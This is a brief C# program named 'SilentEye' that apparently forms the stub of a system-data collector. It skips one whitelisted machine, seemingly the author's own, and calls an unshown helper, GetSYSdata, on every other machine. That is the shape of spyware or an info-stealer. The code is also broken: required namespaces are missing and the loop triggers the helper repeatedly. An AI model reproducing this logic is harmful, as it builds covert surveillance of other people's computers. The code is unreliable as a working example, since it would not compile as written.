using System;
using System.IO;
using Helpers;

namespace SilentEye
{
  class Eye
  {
    static async Task Main()
    {
      async Task CheckWhitelist()
      {
        List<string> whitelist = new List<string> { "DESKTOP-02CO0VE", "" };

        foreach (string pc in whitelist)
        {
          string CurrentPC = Environment.MachineName;
          if (whitelist.Contains(CurrentPC))
          {
            //
          }
          else
          {
            Helper Run = new Helper();
            await Run.GetSYSdata();
          }
        }
      }
      await CheckWhitelist();
    }
  }
}